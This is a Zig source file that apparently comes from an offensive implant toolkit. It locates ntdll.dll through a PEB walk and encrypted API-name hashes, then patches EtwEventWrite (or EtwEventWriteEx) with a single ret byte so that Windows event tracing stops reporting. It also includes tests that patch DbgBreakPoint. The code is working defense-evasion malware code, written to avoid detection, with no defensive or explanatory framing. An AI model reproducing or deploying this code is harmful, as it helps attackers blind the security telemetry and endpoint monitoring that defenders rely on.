const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

pub fn patchEtw() bool {
    const ntdll_hash = hash.encryptedHashModule("ntdll.dll");
    const ntdll = peb_walk.getModuleByHash(ntdll_hash) orelse return false;

    const etw_write = export_resolve.getFunctionByHash(ntdll, hash.encryptedHashFunc("EtwEventWrite")) orelse {
        const etw_write_ex = export_resolve.getFunctionByHash(ntdll, hash.encryptedHashFunc("EtwEventWriteEx")) orelse {
            return false;
        };
        return patchFunction(etw_write_ex);
    };

    return patchFunction(etw_write);
}

fn patchFunction(func: *const anyopaque) bool {
    var prot_base: ?types.PVOID = @ptrCast(@alignCast(func));
    var prot_size: types.SIZE_T = 1;
    var old_prot: types.ULONG = 0;

    const prot_status = engine.NtProtectVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&prot_base)),
        &prot_size,
        types.PAGE_EXECUTE_READWRITE,
        &old_prot,
    );
    if (prot_status < 0) return false;

    const patch_slice = @as(*volatile [1]u8, @ptrCast(@alignCast(func)));
    patch_slice[0] = 0xC3;

    _ = engine.NtFlushInstructionCache(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(types.PVOID, @ptrCast(@alignCast(func))),
        1,
    );

    var restore_base: ?types.PVOID = @ptrCast(@alignCast(func));
    var restore_size: types.SIZE_T = 1;
    _ = engine.NtProtectVirtualMemory(
        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
        @as(*types.PVOID, @ptrCast(&restore_base)),
        &restore_size,
        old_prot,
        &old_prot,
    );

    return true;
}

test "patchEtw handles missing function gracefully" {
    const result = patchEtw();
    _ = result;
}

test "patchFunction roundtrip" {
    const ntdll_hash = hash.encryptedHashModule("ntdll.dll");
    const ntdll = peb_walk.getModuleByHash(ntdll_hash) orelse return error.SkipZigTest;
    const dbg_break = export_resolve.getFunctionByHash(ntdll, hash.encryptedHashFunc("DbgBreakPoint"));
    if (dbg_break == null) return error.SkipZigTest;
    const ok = patchFunction(dbg_break.?);
    try std.testing.expect(ok);
}
